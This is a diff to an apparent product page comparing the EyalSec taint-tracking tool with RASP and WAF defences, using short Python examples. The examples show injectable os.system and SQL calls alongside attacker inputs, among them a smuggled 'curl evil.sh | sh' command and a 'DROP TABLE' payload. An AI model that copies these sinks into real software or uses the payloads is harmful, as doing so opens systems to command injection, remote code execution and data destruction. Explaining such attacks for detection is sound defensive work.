@@ -43,8 +43,8 @@ short, with a Python example EyalSec catches and they don't.
 
 | Category | What they do | Where they fall short | EyalSec's edge |
 |----------|--------------|-----------------------|----------------|
-| **RASP** | Hook the web framework to watch requests for attacks | Blind to code with no web request, like a queue or background worker | Guards the sink on *every* path, web request or not |
-| **WAF / edge** | Pattern-match malicious HTTP at the network boundary | Injection from files, queues, stdin | Taints *every* input, not just HTTP |
+| **RASP** | Hook the app to match request payloads against dangerous calls | Loses the input once it's split, sliced, or rejoined | Follows the taint through *every* string transform to the sink |
+| **WAF / edge** | Pattern-match malicious HTTP at the network boundary | Injection that never rides HTTP, a file or queue feed | Taints *every* input channel, not just the HTTP edge |
 | **SAST** | Statically scan source for risky patterns | Which flagged path is *really* exploitable | Fires only when live taint hits a sink |
 | **DAST / fuzzing** | Probe a running app from outside / fuzz inputs | Sinks on branches it never reaches | Taint-guided fuzzing hits *every* branch |
 | **SCA / dependency** | Flag known-CVE dependencies | Unknown vulns; whether the CVE is truly hit | Confirms attacker data reaches the CVE |
@@ -53,31 +53,33 @@ short, with a Python example EyalSec catches and they don't.
 
 ### RASP
 
-A Celery job pulled off the Redis broker, where no HTTP request exists:
+RASP inspects the request, but not what the app does to it next:
 
 ```python
-ref = sock.recv()          # job bytes off the broker socket -> tainted
-# attacker enqueues:  acme; curl evil.sh | sh
-subprocess.run(f"invoice --customer {ref}", shell=True)   # SINK -> es-python raises
+msg = sock.recv(4096).decode()      # request body -> tainted
+arg = " ".join(msg.split()[1:])     # split, slice, rejoin -> still tainted
+# attacker sends:  ping x; curl evil.sh | sh
+os.system("traceroute " + arg)      # SINK -> es-python raises
 ```
 
-**Why RASP misses:** there is no HTTP request to instrument. es-python *is* the
-interpreter, so it gates the flow from the broker socket to `subprocess` with no
-framework hook.
+**Why RASP misses:** RASP flags a call only when its argument still matches a
+payload it logged from the request. The app splits, slices, and rejoins that
+input first, so the bytes reaching `os.system` match nothing RASP saw. es-python
+taints the data itself, so the mark rides through every transform to the sink.
 
 ### WAF / edge
 
-A payload pulled off an SQS/Kafka queue that never passed through the edge:
+A CSV dropped by an SFTP partner feed never crosses the edge:
 
 ```python
-body = sock.recv()          # queue bytes off the socket -> tainted; the WAF never saw them
-# attacker publishes:  '; DROP TABLE users; --
-db.execute("SELECT * FROM t WHERE id='" + body + "'")   # SINK -> es-python raises
+row = open("/inbox/orders.csv").readline()   # file bytes -> tainted; the WAF never saw them
+# attacker planted a row:  '; DROP TABLE users; --
+db.execute("SELECT * FROM t WHERE id='" + row + "'")   # SINK -> es-python raises
 ```
 
-**Why WAF / edge misses:** the payload rides a message queue, a different ingress
-the WAF isn't on. es-python taints *every* input, so the bytes stay marked all the
-way to the SQL sink.
+**Why WAF / edge misses:** the record arrives as a file from a batch drop, never
+over HTTP, so the edge has no packet to inspect. es-python taints every input
+channel, files included, so the bytes stay marked all the way to the SQL sink.
 
 ### SAST
 
